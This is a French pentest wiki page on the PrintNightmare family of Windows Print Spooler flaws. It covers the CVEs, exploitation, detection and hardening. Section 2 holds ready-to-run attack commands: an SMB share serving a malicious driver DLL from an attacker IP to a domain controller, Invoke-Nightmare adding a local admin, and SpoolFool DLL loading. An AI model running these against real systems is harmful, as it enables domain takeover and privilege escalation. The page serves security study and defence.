# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare est le nom collectif donné à une famille de vulnérabilités dans le service **Print Spooler** de Windows qui permettent **l'exécution de code arbitraire en tant que SYSTEM** et, lorsque le spooler est accessible via RPC, **l'exécution de code à distance (RCE) sur les contrôleurs de domaine et les serveurs de fichiers**. Les CVEs les plus largement exploités sont **CVE-2021-1675** (initialement classé comme LPE) et **CVE-2021-34527** (RCE complet). Des problèmes ultérieurs tels que **CVE-2021-34481 (“Point & Print”)** et **CVE-2022-21999 (“SpoolFool”)** prouvent que la surface d'attaque est encore loin d'être fermée.

---

## 1. Composants vulnérables & CVEs

| Année | CVE | Nom court | Primitive | Remarques |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Corrigé dans le CU de juin 2021 mais contourné par CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx permet aux utilisateurs authentifiés de charger un DLL de pilote à partir d'un partage distant|
|2021|CVE-2021-34481|“Point & Print”|LPE|Installation de pilote non signé par des utilisateurs non administrateurs|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Création de répertoires arbitraires → Plantage de DLL – fonctionne après les correctifs de 2021|

Tous abusent de l'une des méthodes RPC **MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ou des relations de confiance à l'intérieur de **Point & Print**.

## 2. Techniques d'exploitation

### 2.1 Compromission du contrôleur de domaine à distance (CVE-2021-34527)

Un utilisateur de domaine authentifié mais **non privilégié** peut exécuter des DLL arbitraires en tant que **NT AUTHORITY\SYSTEM** sur un spooler distant (souvent le DC) en :
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Les PoCs populaires incluent **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) et les modules `misc::printnightmare / lsa::addsid` de Benjamin Delpy dans **mimikatz**.

### 2.2 Élévation de privilèges locale (tous les Windows pris en charge, 2021-2024)

La même API peut être appelée **localement** pour charger un pilote depuis `C:\Windows\System32\spool\drivers\x64\3\` et obtenir des privilèges SYSTEM :
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – contournement des correctifs de 2021

Les correctifs de Microsoft de 2021 ont bloqué le chargement de pilotes à distance mais **n'ont pas durci les permissions des répertoires**. SpoolFool abuse du paramètre `SpoolDirectory` pour créer un répertoire arbitraire sous `C:\Windows\System32\spool\drivers\`, dépose une DLL de charge utile et force le spouleur à la charger :
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> L'exploit fonctionne sur Windows 7 → Windows 11 entièrement patché et Server 2012R2 → 2022 avant les mises à jour de février 2022

---

## 3. Détection & chasse

* **Journaux d'événements** – activez les canaux *Microsoft-Windows-PrintService/Operational* et *Admin* et surveillez **l'ID d'événement 808** “Le spouleur d'impression a échoué à charger un module plug-in” ou les messages **RpcAddPrinterDriverEx**.
* **Sysmon** – `ID d'événement 7` (Image chargée) ou `11/23` (Écriture/suppression de fichier) à l'intérieur de `C:\Windows\System32\spool\drivers\*` lorsque le processus parent est **spoolsv.exe**.
* **Lignée des processus** – alertes chaque fois que **spoolsv.exe** génère `cmd.exe`, `rundll32.exe`, PowerShell ou tout binaire non signé.

## 4. Atténuation & durcissement

1. **Mettez à jour !** – Appliquez la dernière mise à jour cumulative sur chaque hôte Windows ayant le service Print Spooler installé.
2. **Désactivez le spouleur là où il n'est pas nécessaire**, en particulier sur les contrôleurs de domaine :
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Bloquez les connexions à distance** tout en permettant l'impression locale – Stratégie de groupe : `Configuration de l'ordinateur → Modèles administratifs → Imprimantes → Autoriser le spouleur d'impression à accepter les connexions des clients = Désactivé`.
4. **Restreindre Point & Print** afin que seuls les administrateurs puissent ajouter des pilotes en définissant la valeur du registre :
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Guide détaillé dans Microsoft KB5005652

---

## 5. Recherche / outils connexes

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* Exploit SpoolFool & compte rendu
* Micropatches 0patch pour SpoolFool et d'autres bugs de spouleur

---

**Lecture complémentaire (externe) :** Consultez le billet de blog de 2024 – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Références

* Microsoft – *KB5005652 : Gérer le nouveau comportement d'installation de pilote par défaut de Point & Print*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool : CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
